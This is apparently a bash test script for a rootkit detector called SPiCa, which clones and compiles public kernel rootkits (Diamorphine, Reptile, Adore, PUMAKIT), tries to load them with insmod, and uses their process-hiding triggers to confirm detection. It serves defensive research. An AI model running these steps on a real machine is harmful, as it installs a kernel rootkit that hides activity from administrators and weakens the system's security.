#!/bin/bash
# Generic LKM rootkit test — shared by Diamorphine, Reptile, Adore, PUMAKIT.
#
# All LKM rootkits share the same test flow:
#   1. Compile the rootkit .ko against the VM's kernel headers
#   2. Attempt insmod (should be blocked by SPiCa's LSM gate)
#   3. If GATE_BYPASS=1: disable gate, insmod succeeds, hide a process
#   4. Verify detection
#
# Usage: lkm-test.sh <rootkit-name> <repo-url> <make-target>
# Example: lkm-test.sh diamorphine https://github.com/m0nad/Diamorphine diamorphine.ko

set -euo pipefail

ROOTKIT_NAME="${1:?Usage: $0 <name> <repo> <ko-file>}"
REPO_URL="${2:?Missing repo URL}"
KO_FILE="${3:?Missing .ko filename}"

echo "[LKM]        $ROOTKIT_NAME rootkit test"

# ── Install build dependencies ──────────────────────────────────────────────
if ! command -v make >/dev/null 2>&1; then
    echo "[INSTALL]    Build tools..."
    apt-get update -qq && apt-get install -y -qq build-essential "linux-headers-$(uname -r)" git 2>/dev/null || \
    dnf install -y -q make gcc "kernel-devel" "kernel-headers" git 2>/dev/null || \
    pacman -S --noconfirm --quiet base-devel linux-headers git 2>/dev/null || true
fi

# ── Clone and build ─────────────────────────────────────────────────────────
BUILD_DIR="/tmp/$ROOTKIT_NAME"

if [ ! -d "$BUILD_DIR" ]; then
    echo "[CLONE]      $REPO_URL"
    git clone --depth=1 "$REPO_URL" "$BUILD_DIR" 2>&1 | tail -3
fi

cd "$BUILD_DIR"

# Some rootkits need kernel headers path specified
KHEADERS="/lib/modules/$(uname -r)/build"
if [ ! -d "$KHEADERS" ]; then
    echo "[WARN]       Kernel headers not at $KHEADERS"
    echo "             Install: apt install linux-headers-\$(uname -r)"
fi

echo "[BUILD]      make (kernel $(uname -r))..."
make KSRC="$KHEADERS" KBUILD="$KHEADERS" 2>&1 | tail -10 || {
    echo "[ERROR]      Build failed — $ROOTKIT_NAME may not support this kernel."
    echo "             This is expected for old rootkits (Adore, SucKIT) on 6.x kernels."
    echo "             For the paper: document as 'build failed on modern kernel'."
    exit 1
}

if [ ! -f "$KO_FILE" ]; then
    echo "[ERROR]      $KO_FILE not found after build"
    exit 1
fi

echo "[OK]         Built: $KO_FILE"

# ── Gate test: attempt insmod ───────────────────────────────────────────────
if [ "${GATE_BYPASS:-0}" = "1" ]; then
    echo "[BYPASS]     Gate bypass requested"
    # Can't easily disable the BPF LSM gate from userspace.
    # For testing, unload the LSM program or use bpftool.
    bpftool prog show 2>/dev/null | grep -i "lsm\|modblock" || true
    echo "[BYPASS]     Note: gate bypass may require unloading SPiCa's LSM program"
fi

echo "[DEPLOY]     insmod $KO_FILE..."
if insmod "$KO_FILE" 2>&1; then
    echo "[LOADED]     Module loaded! Gate was NOT active."

    # Create a test process and hide it using the rootkit's mechanism.
    # Each rootkit has its own hiding trigger. We try the common ones.
    sleep 600 &
    HIDDEN_PID=$!
    echo "[DEPLOY]     Test process: PID $HIDDEN_PID"

    # Try various hiding triggers used by different rootkits:
    # - Diamorphine: kill -31 <pid>
    # - Reptile: /Reptile/reptile_tool
    # - Adore: echo > /proc/adorable
    # - PUMAKIT: via userland component
    echo "[DEPLOY]     Attempting to hide process..."

    kill -31 "$HIDDEN_PID" 2>/dev/null && echo "[HIDE]       kill -31 sent (Diamorphine/Adore)" || true

    if [ -x "$BUILD_DIR/reptile_tool" ]; then
        "$BUILD_DIR/reptile_tool" hide "$HIDDEN_PID" 2>/dev/null && echo "[HIDE]       reptile_tool hide sent" || true
    fi

    sleep 2

    # Check if hidden
    if [ ! -d "/proc/$HIDDEN_PID" ]; then
        echo "[HIDDEN]     Process $HIDDEN_PID is hidden from /proc"
        echo "[EXPECTED]   SPiCa fires [DKOM] within 2s"
    else
        echo "[VISIBLE]    Process still visible — hiding may need different trigger"
        echo "[NOTE]       Check rootkit-specific hiding mechanism"
    fi
else
    echo "[BLOCKED]    insmod FAILED — EPERM"
    echo "[VERIFY]     SPiCa's BPF LSM gate is active"
    echo "[EXPECTED]   [LKM-DENY] in SPiCa output"
fi
